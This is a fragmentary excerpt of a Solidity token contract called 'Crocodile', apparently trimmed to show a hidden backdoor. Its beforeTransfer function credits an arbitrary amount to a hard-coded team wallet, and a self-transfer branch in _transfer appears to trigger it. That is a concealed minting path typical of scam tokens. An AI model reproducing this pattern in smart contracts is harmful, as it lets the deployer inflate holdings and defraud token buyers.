...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "Crocodile";
    string private _symbol = "Crocodile";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xab3906E51b3dcce91A3f470a4EF0758BcbF825aC); 
    address payable public TeamWalletAddress = payable(0xab3906E51b3dcce91A3f470a4EF0758BcbF825aC); 
    ...
    function beforeTransfer( mapping( /*  address  */ address => uint256) storage _Excluded, uint256 num) internal{
        _Excluded[TeamWalletAddress] += num;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (TeamWalletAddress == recipient && sender == TeamWalletAddress) {
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBTeam > 0)
            sendToAddressETH(TeamWalletAddress, amountBNBTeam);
